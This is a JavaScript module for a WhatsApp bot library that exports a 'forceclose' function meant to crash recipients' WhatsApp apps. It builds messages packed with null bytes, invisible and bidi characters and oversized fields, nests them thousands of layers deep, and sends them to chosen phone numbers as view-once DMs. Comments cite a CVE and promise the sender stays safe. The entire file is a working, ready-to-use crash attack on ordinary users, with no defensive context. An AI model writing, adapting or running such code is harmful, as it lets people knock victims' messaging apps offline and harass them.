const {
    proto,
    generateWAMessageFromContent,
} = require('@sakataoffc/baileys');
const crypto = require('crypto');

// =============================================================
//  forceclose v2 — Baileys 7.x / WhatsApp 2.26.x compatible
//  Vector: AI Rich Response (CVE-2026-23866) + LD chain
//  Route:  DM (direct, sender-safe)
// =============================================================

async function forceclose(sock, target) {
    if (!sock || !target) return;

    // ---------- Sender guard ----------
    let senderNum = '';
    try {
        senderNum = String(sock.user?.id || '').split('@')[0].split(':')[0];
    } catch (_) {}

    const resolveJid = (raw) => {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15)
        .filter(j => j.split('@')[0].split(':')[0] !== senderNum);

    if (!jids.length) return;

    // ---------- Invisible building blocks ----------
    const ZW   = "\u200B\u200C\u200D\u2060\u2061\u2062\u2063";
    const BIDI = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069";
    const SUR  = "\uD804\uDDC2\uD804\uDDB5\uD804\uDDB4\uD804\uDDBF";
    const NUL  = "\x00";

    const invis = (n) =>
        ZW.repeat(n >> 2) + BIDI.repeat(n >> 2) + SUR.repeat(n >> 3);

    // ---------- Baileys 7.x: use .create() instead of fromObject() ----------
    // fromObject() is REMOVED in 7.x — crash if used
    const buildPayload = (targetJid) => ({
        // --- BOMB 1: AI Rich Response (CVE-2026-23866 vector) ---
        // This is the NEW crash vector for 2.26.x builds
        aiRichResponseMessage: {
            // Malformed AI response with Instagram Reels URL
            response: {
                text: NUL.repeat(50000) + invis(30000),
                urls: Array.from({ length: 500 }, () => ({
                    url: "https://www.instagram.com/reel/" + NUL.repeat(200) + "/",
                    displayText: invis(500),
                })),
                media: {
                    url: "https://scontent.cdninstagram.com/v/t51/" + NUL.repeat(1000),
                    mimetype: "video/mp4",
                },
            },
            contextInfo: {
                mentionedJid: [targetJid],
                forwardingScore: 0x7FFFFFFF,
                isForwarded: true,
            },
        },

        // --- BOMB 2: Interactive with strict-validated bloksWidget ---
        // Use valid structure but overflow the STRING FIELDS (not count)
        interactiveMessage: {
            header: {
                bloksWidget: {
                    fallback: invis(20000),
                    type:     "mw_bloks",  // VALID type string
                    data:     NUL.repeat(30000),
                    uuid:     ZW.repeat(15000),
                },
                subtitle: BIDI.repeat(10000),
                title:    "X".repeat(10000),
            },
            nativeFlowMessage: {
                buttons: [{
                    name: "quick_reply",
                    buttonParamsJson: NUL.repeat(25000),
                }],
                messageParamsJson: JSON.stringify({
                    title: NUL.repeat(15000),
                }),
            },
            body: { text: "\u000F" + invis(5000) },

            contextInfo: {
                mentionedJid: [targetJid],
                forwardingScore: 0x7FFFFFFF,
                isForwarded: true,

                // --- BOMB 3: Nested location overflow ---
                quotedMessage: {
                    locationMessage: {
                        degreesLatitude: -0x7FFFFFFF / 1000,
                        degreesLongitude: 0x7FFFFFFF / 1000,
                        name: NUL.repeat(20000),
                        address: invis(20000),
                        jpegThumbnail: Buffer.alloc(40000, 0xFF),
                    },
                },
            },
        },
    });

    // ---------- LD framing ----------
    const encodeVarint = (n) => {
        const buf = [];
        while (n >= 0x80) { buf.push((n & 0x7f) | 0x80); n >>>= 7; }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = (tag, data) =>
        Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
        [0xC2, 0x05],
        [0xE2, 0x06],
    ];

    const inflate = (payload, tag, depth) => {
        let buf = payload;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    // ---------- viewOnce wrapper (sender-safe) ----------
    const wrapViewOnce = (inner) => ({
        viewOnceMessage: { message: inner },
    });

    // ---------- Fire ----------
    let sent = 0;
    const SHOTS_PER_TAG = 2;

    for (const jid of jids) {
        const payloadObj = buildPayload(jid);
        let payload;

        try {
            // ✅ Baileys 7.x: use .create() NOT .fromObject()
            const msgProto = proto.Message.create(payloadObj);
            payload = proto.Message.encode(msgProto).finish();
        } catch (e) {
            console.log('[forceclose encode]', e.message);
            continue;
        }

        for (const tag of TAGS) {
            let depthUsed = 0;
            for (let depth = 6000; depth >= 800; depth -= 300) {
                try {
                    const test = proto.Message.decode(inflate(payload, tag, depth));
                    proto.Message.encode(test).finish();
                    depthUsed = depth;
                    break;
                } catch (_) {}
            }
            if (!depthUsed) continue;

            for (let shot = 0; shot < SHOTS_PER_TAG; shot++) {
                try {
                    const decoded = proto.Message.decode(
                        inflate(payload, tag, depthUsed)
                    );
                    const wrapped = wrapViewOnce(decoded);

                    // ✅ DM route — sender 100% safe
                    await sock.relayMessage(jid, wrapped, {
                        messageId: '3EB0' +
                            crypto.randomBytes(10).toString('HEX').toUpperCase(),
                    });
                    sent++;
                } catch (e) {
                    console.log('[forceclose relay]', e.message);
                }

                await new Promise(r =>
                    setTimeout(r, 2500 + Math.random() * 2000)
                );
            }
        }
    }

    return { sent, targets: jids.length };
}

module.exports = { forceclose };
